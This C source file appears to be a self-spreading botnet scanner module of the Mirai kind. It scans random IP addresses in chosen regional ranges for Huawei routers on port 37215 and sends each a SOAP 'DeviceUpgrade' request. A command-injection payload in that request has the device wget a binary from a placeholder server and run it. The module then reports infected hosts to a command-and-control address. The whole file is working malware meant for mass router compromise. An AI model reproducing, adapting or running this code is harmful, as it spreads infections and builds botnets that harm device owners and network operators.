#include "includes.h"
#include "huawei.h"
#include "rand.h"
#include "util.h"

#ifdef SELFREP

#define HUAWEI_SCANNER_MAX_CONNS 128
#define HUAWEI_SCANNER_RAW_PPS 160
#define HUAWEI_SCANNER_PORT 37215

/* Huawei SOAP exploit payload */
static char *huawei_payload = 
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
"<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n"
"<s:Body>\r\n"
"<u:Upgrade xmlns:u=\"urn:dslforum-org:service:DeviceConfig:1\">\r\n"
"<NewStatusURL>http://$(wget http://HTTP_SERVER/bins/axis.$(uname -m) -O /tmp/m;sh /tmp/m)</NewStatusURL>\r\n"
"<NewDownloadURL>$(wget http://HTTP_SERVER/bins/axis.$(uname -m) -O /tmp/m;sh /tmp/m)</NewDownloadURL>\r\n"
"</u:Upgrade>\r\n"
"</s:Body>\r\n"
"</s:Envelope>\r\n";

struct huawei_conn {
    int fd;
    ipv4_t dst_addr;
    uint8_t state;
    time_t last_recv;
};

static struct huawei_conn conns[HUAWEI_SCANNER_MAX_CONNS];

static ipv4_t get_random_ip_huawei(void);
static void huawei_connect(struct huawei_conn *);
static void huawei_close(struct huawei_conn *);

void huawei_scanner_init(void) {
    if (fork() == 0) {
        int i;
        
        for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
            conns[i].fd = -1;
            conns[i].state = 0;
        }
        
        while (TRUE) {
            fd_set fdset;
            struct timeval tv;
            int maxfd = 0;
            
            FD_ZERO(&fdset);
            
            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1) {
                    FD_SET(conns[i].fd, &fdset);
                    if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                }
            }
            
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            
            select(maxfd + 1, &fdset, NULL, NULL, &tv);
            
            /* Check timeouts */
            time_t now = time(NULL);
            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && now - conns[i].last_recv > 10) {
                    huawei_close(&conns[i]);
                }
            }
            
            /* Process readable sockets */
            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd != -1 && FD_ISSET(conns[i].fd, &fdset)) {
                    char buf[1024];
                    int n = recv(conns[i].fd, buf, sizeof(buf), 0);
                    if (n <= 0) {
                        huawei_close(&conns[i]);
                    } else {
                        conns[i].last_recv = now;
                        /* Check for successful exploit */
                        if (util_stristr(buf, n, "OK") || util_stristr(buf, n, "Success")) {
                            /* Report to C&C */
                            uint8_t report[8];
                            uint32_t addr = conns[i].dst_addr;
                            report[0] = (addr >> 24) & 0xFF;
                            report[1] = (addr >> 16) & 0xFF;
                            report[2] = (addr >> 8) & 0xFF;
                            report[3] = addr & 0xFF;
                            report[4] = 0;
                            report[5] = 0;
                            report[6] = 8; // username len
                            memcpy(report + 7, "huawei", 6);
                            report[7] = 0; // password len
                            
                            int fd = socket(AF_INET, SOCK_STREAM, 0);
                            struct sockaddr_in cnc;
                            cnc.sin_family = AF_INET;
                            cnc.sin_addr.s_addr = inet_addr(CNC_ADDR);
                            cnc.sin_port = htons(HUAWEI_SCANNER_PORT);
                            if (connect(fd, (struct sockaddr *)&cnc, sizeof(cnc)) == 0) {
                                send(fd, report, 8, 0);
                            }
                            close(fd);
                        }
                        huawei_close(&conns[i]);
                    }
                }
            }
            
            /* Start new connections */
            for (i = 0; i < HUAWEI_SCANNER_MAX_CONNS; i++) {
                if (conns[i].fd == -1) {
                    conns[i].dst_addr = get_random_ip_huawei();
                    huawei_connect(&conns[i]);
                    break;
                }
            }
            
            sleep(1);
        }
    }
}

static ipv4_t get_random_ip_huawei(void) {
    ipv4_t addr;
    
    while (TRUE) {
        addr = rand_next();
        
        /* Target specific ranges where Huawei devices are common */
        uint8_t first_octet = (addr >> 24) & 0xFF;
        
        /* Africa and Middle East ranges */
        if (first_octet == 157 || first_octet == 197 || first_octet == 41) {
            break;
        }
    }
    
    return addr;
}

static void huawei_connect(struct huawei_conn *conn) {
    struct sockaddr_in addr;
    
    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->fd == -1) return;
    
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(HUAWEI_SCANNER_PORT);
    
    if (connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr)) == 0 || errno == EINPROGRESS) {
        /* Send exploit payload */
        send(conn->fd, "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n", 39, 0);
        send(conn->fd, "Host: ", 6, 0);
        
        char ip_str[32];
        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d\r\n",
            (conn->dst_addr >> 24) & 0xFF,
            (conn->dst_addr >> 16) & 0xFF,
            (conn->dst_addr >> 8) & 0xFF,
            conn->dst_addr & 0xFF);
        send(conn->fd, ip_str, util_strlen(ip_str), 0);
        
        send(conn->fd, "Content-Type: text/xml\r\n", 24, 0);
        send(conn->fd, "SOAPAction: urn:dslforum-org:service:DeviceConfig:1#Upgrade\r\n", 62, 0);
        send(conn->fd, "Connection: close\r\n", 19, 0);
        
        char len_str[16];
        snprintf(len_str, sizeof(len_str), "Content-Length: %d\r\n\r\n", util_strlen(huawei_payload));
        send(conn->fd, len_str, util_strlen(len_str), 0);
        send(conn->fd, huawei_payload, util_strlen(huawei_payload), 0);
        
        conn->last_recv = time(NULL);
    } else {
        close(conn->fd);
        conn->fd = -1;
    }
}

static void huawei_close(struct huawei_conn *conn) {
    if (conn->fd != -1) {
        close(conn->fd);
        conn->fd = -1;
    }
}

#endif
